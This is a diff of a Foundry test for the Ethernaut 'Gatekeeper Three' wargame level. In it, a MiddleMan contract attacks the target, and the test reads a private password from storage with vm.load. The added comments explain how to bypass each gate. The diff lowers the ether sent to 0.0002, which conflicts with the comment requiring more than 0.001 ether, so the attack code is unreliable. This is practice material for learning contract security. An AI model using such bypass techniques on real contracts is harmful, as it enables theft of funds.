@@ -9,7 +9,7 @@ contract MiddleMan {
 
     function attack(address prey, uint256 password) public {
         GatekeeperThree instance = GatekeeperThree(payable(prey));
-        address(instance).call{value: 0.0011 ether}("");
+        address(instance).call{value: 0.0002 ether}("");
         instance.construct0r();
         instance.getAllowance(password);
         instance.enter();
@@ -20,6 +20,9 @@ contract MiddleMan {
     }
 }
 
+// gateOne: requires using a contract as a middle man
+// gateTwo: vm.load() to find out the private state var
+// gateThree: send > 0.001 ether & always revert() on middle man's receive()
 contract GatekeeperThreeTest is Test {
     GatekeeperThree instance;
 
@@ -34,7 +37,7 @@ contract GatekeeperThreeTest is Test {
         instance.createTrick();
         SimpleTrick trick = SimpleTrick(instance.trick());
         // SimpleTrick trick = SimpleTrick(vm.envAddress("GATEKEEPER_THREE_TRICK"));
-        // uint256 password = 1738764324;
+
         uint256 password = uint256(vm.load(address(trick), bytes32(uint256(2))));
         console.logUint(password);
 
